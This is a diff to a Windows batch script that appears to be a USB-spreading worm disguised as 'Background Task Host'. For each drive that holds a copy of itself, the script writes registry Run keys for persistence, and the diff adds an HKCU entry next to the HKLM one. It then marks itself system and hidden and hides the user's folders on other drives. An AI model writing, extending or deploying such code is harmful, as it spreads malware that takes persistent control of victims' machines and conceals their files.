@@ -36,7 +36,7 @@
 chcp 65001>nul
 
 %~d0
-cd %~dp0
+cd "%~dp0"
 
 
 
@@ -67,10 +67,11 @@ for /f "skip=4 delims= " %%i in ('tasklist /fi "imagename eq backgroundTaskHost.
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
   if exist "%%i:\" (
     if exist "%%i:\%~nx0" (
+      reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host - %%i" /d "%%i:\%~nx0" /f
       reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host - %%i" /d "%%i:\%~nx0" /f
       attrib +s +h "%%i:\%~nx0"
 
-      if "%%i:" NEQ "%SystemDrive%" if "%%i" NEQ "D" (
+      if "%%i:" NEQ "%systemDrive%" if "%%i" NEQ "D" (
         for /f "delims=" %%x in ('dir "%%i:\*" /a:d /b 2^>nul') do (
           if "%%x" NEQ "$RECYCLE.BIN" if "%%x" NEQ "FOUND.000" if "%%x" NEQ "Recycled" if "%%x" NEQ "System Volume Information" (
             attrib +h "%%i:\%%x"
